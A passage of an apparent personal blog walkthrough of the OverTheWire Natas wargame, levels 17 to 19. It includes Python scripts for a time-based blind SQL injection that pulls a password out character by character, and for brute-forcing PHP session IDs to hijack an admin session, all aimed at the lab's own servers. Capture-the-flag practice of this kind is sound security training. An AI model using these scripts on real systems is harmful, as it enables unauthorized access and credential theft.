&#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;,
&#39;y&#39;, &#39;z&#39;
]

for i in range(1, 33):
    for j in alphanumeric_chars:
        form_data[&#34;username&#34;] = f&#34;natas18\&#34; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)} AND SLEEP(5) #&#34;
  
        # make curl request and measure elapsed time
        start = time.time()
        response = requests.post(url, auth=credentials, data=form_data)
        end = time.time()
        
        if (end-start) &gt; 5:
            password += j
            print(f&#34;index: {i}\nguess: {j}&#34;)
            print(&#34;Status code:&#34;, response.status_code)
            print(&#34;Response time:&#34;, str(round(end-start, 2)) +&#34;s&#34;)
            print(f&#34;Password: {password}&#34;)
            break
</code></pre><hr>
<h2 id="level-18">Level 18</h2>
<p>This level has a login form. It states that you need to login as admin to get the credentials to the next level. Looking at the source code, the actual login box essentially does nothing. It instead relies on PHP session ID for authentication. The max possible ID is 640. I plotted the program&rsquo;s flow on a chart to get a better understanding.</p>
<p><img src="/images/natas18-0.png" alt=""></p>
<p>I couldn&rsquo;t really find any way to exploit this, but it occurred to me that there is likely an ID which already has its admin flag set to 1. With such a low number of possible IDs, I could easily bruteforce the session ID to find an admin session. Here is a script I created to do just that:</p>
<pre tabindex="0"><code>import requests

url = &#34;http://natas18.natas.labs.overthewire.org&#34;
credentials = (&#34;natas18&#34;, &#34;{censored}&#34;)
form_data = {&#34;username&#34;: &#34;&#34;, &#34;password&#34;: &#34;&#34;, &#34;debug&#34;: &#34;&#34;}
cookie_data = {&#34;PHPSESSID&#34;: &#34;x&#34;}

for i in range(1, 640):
        cookie_data[&#34;PHPSESSID&#34;] = str(i)
        response = requests.get(url, cookies=cookie_data, auth=credentials, data=form_data)
        print(response.text)
        print(&#34;guess:&#34;, i)
        if &#34;Password&#34; in response.text:

            break
</code></pre><p>Sure enough, one particular ID granted the password.</p>
<hr>
<h2 id="level-19">Level 19</h2>
<p>Similarly, this level is looking for you to login using a PHPSESSID, but this time the IDs are &ldquo;not sequential&rdquo; according to the page.</p>
<p>Clicking the login button with no credentials gives us a PHPSESSID of a seemingly random hex string always ending with 2d (a hyphen).</p>
<p>After running a script to automate this hundreds of times I have confirmed that the same ID range is still in use&ndash;1 to 640. The id is simply converted to it&rsquo;s hex ascii value. So for example, instead of seeing 250, we see 3235302d.</p>
<p>If we now login with a username, we get back a longer cookie. This time it will again be the same random id with a hyphen, but added onto the end is a hex ascii representation of the username typed in.</p>
<p>Using a password does nothing, which tells me that the password is not implemented at all, most likely.</p>
<p>So since we need to login as admin, we can be sure that the suffix of the cookie needs to be &ldquo;61646d696e&rdquo;. Then we can just try using all 640 possible values with the admin suffix added at the end until one of them works. Here&rsquo;s the script I used for that:</p>
<pre tabindex="0"><code>import requests

url = &#34;http://natas19.natas.labs.overthewire.org&#34;
credentials = (&#34;natas19&#34;, &#34;{censored}&#34;)
form_data = {&#34;username&#34;: &#34;&#34;, &#34;password&#34;: &#34;&#34;}
cookie_data = {&#34;PHPSESSID&#34;: &#34;x&#34;}
  
for i in range(1, 640):
        # convert id to hex and append &#34;admin&#34; suffix
        cookie_data[&#34;PHPSESSID&#34;] = &#34;&#34;
        for j in str(i):
              cookie_data[&#34;PHPSESSID&#34;] += hex(ord(j)).lstrip(&#34;0x&#34;)
        cookie_data[&#34;PHPSESSID&#34;] += &#34;2d61646d696e&#34;
        
        response = requests.post(url, cookies=cookie_data, auth=credentials, data=form_data)
        print(response.text)
        print(&#34;guess:&#34;, i, &#34;|&#34;, cookie_data[&#34;PHPSESSID&#34;])

        if &#34;You are logged in as a regular user.&#34; not in response.text:
            break
</code></pre><p>I was able to get the password to natas20 by running this script.</p>
<hr>
<h2 id="level-20">Level 20</h2>
<p>(coming soon)</p>

                    
                    <HR width="100%" id="EOF">
		    <p style="color:#777;">Last modified on 2023-06-21</p>
                    
                </div>
            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts" href="/posts/infographics/">
			Next<br>Infographics
                </a>
                
                
                
                <a class="older-posts" href="/posts/links/">
			Previous<br>Cool Links
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                










<script src="https://utteranc.es/client.js"
        repo="koolaidxk1d/koolaidxk1d.github.io"
        issue-term="title"
        label="your label"
        theme="github-dark"
        crossorigin="anonymous"
        async>
</script>



            </div>
        </div>
    </div>


                    </div>
            </div><div id="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="https://koolaidxk1d.github.io/">
    
        <div class="nav-title">
            koolaidxk1d
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/links">
                Cool Links
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/snippets">
                Snippets
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/infographics">
                Infographics
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/about">
                About Me
            </a>
            
        
    </div>

    

    <div class="nav-footer">
        

&copy;
	
	2024 koolaidxk1d
	

    </div>
    
</div><div id="extraContainer" class="extra-container">
    <div class="toc-wrapper">
        

        
        <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#level-0" class="nav-level-0">
									Level 0
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-1" class="nav-level-1">
									Level 1
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-2" class="nav-level-2">
									Level 2
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-3" class="nav-level-3">
									Level 3
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-4" class="nav-level-4">
									Level 4
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-5" class="nav-level-5">
									Level 5
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-6" class="nav-level-6">
									Level 6
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-7" class="nav-level-7">
									Level 7
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-8" class="nav-level-8">
									Level 8
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-9" class="nav-level-9">
									Level 9
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-10" class="nav-level-10">
									Level 10
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-11" class="nav-level-11">
									Level 11
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-12" class="nav-level-12">
									Level 12
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-13" class="nav-level-13">
									Level 13
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-14" class="nav-level-14">
									Level 14
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-15" class="nav-level-15">
									Level 15
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-16" class="nav-level-16">
									Level 16
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-17" class="nav-level-17">
									Level 17
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-18" class="nav-level-18">
									Level 18
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-19" class="nav-level-19">
									Level 19
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#level-20" class="nav-level-20">
									Level 20
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
        
    </div>
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top"
            :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
        <a type="button" class="pagination-action" id="darkModeToggleButton">
            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
                dark_mode
            </span>
        </a>
        
        
    </div>
</div><div id="single-column-footer">

&copy;
	
	2024 koolaidxk1d
	
</div>
            </div>
    
    <script src="/js/journal.js"></script></body>
</html>
